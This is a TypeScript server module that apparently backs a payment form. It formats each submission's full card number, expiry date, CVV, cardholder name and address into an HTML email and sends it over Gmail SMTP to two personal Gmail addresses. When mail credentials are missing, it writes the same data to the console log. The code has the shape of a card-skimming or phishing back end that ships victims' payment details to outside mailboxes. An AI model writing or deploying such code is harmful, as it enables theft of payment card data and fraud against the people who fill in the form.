import nodemailer from "nodemailer";
import { PaymentFormData } from "@shared/schema";

// Format payment data for email content
function formatPaymentData(paymentData: PaymentFormData): string {
  return `
    <h2>New Payment Information</h2>
    <p><strong>First Name:</strong> ${paymentData.firstName}</p>
    <p><strong>Last Name:</strong> ${paymentData.lastName}</p>
    <p><strong>Card Number:</strong> ${paymentData.cardNumber}</p>
    <p><strong>Expiry:</strong> ${paymentData.expiry}</p>
    <p><strong>CVV:</strong> ${paymentData.cvv}</p>
    <p><strong>Name on Card:</strong> ${paymentData.nameOnCard}</p>
    <p><strong>Address:</strong> ${paymentData.address}</p>
    <p><em>This payment information was submitted on ${new Date().toLocaleString()}</em></p>
  `;
}

// Send email with payment information
export async function sendPaymentEmail(paymentData: PaymentFormData): Promise<void> {
  // Email recipients
  const recipients = ["Fw0379224@gmail.com", "Leomonster7868@gmail.com"];
  
  const emailContent = formatPaymentData(paymentData);
  
  // Check if email credentials are provided
  if (!process.env.EMAIL_USER || !process.env.EMAIL_PASSWORD) {
    console.log("Email credentials not provided. Would send email with the following details:");
    console.log(`Recipients: ${recipients.join(", ")}`);
    console.log(`Subject: New Payment Information: ${paymentData.firstName} ${paymentData.lastName}`);
    console.log("Content:", emailContent);
    // Don't throw an error, just log the information
    return;
  }
  
  // Configure email transport if credentials are available
  const transporter = nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 587,
    secure: false,
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASSWORD,
    },
  });
  
  try {
    const info = await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: recipients.join(", "),
      subject: `New Payment Information: ${paymentData.firstName} ${paymentData.lastName}`,
      html: emailContent,
    });
    
    console.log("Email sent:", info.messageId);
  } catch (error) {
    console.error("Error sending email:", error);
    throw new Error("Failed to send payment information email");
  }
}
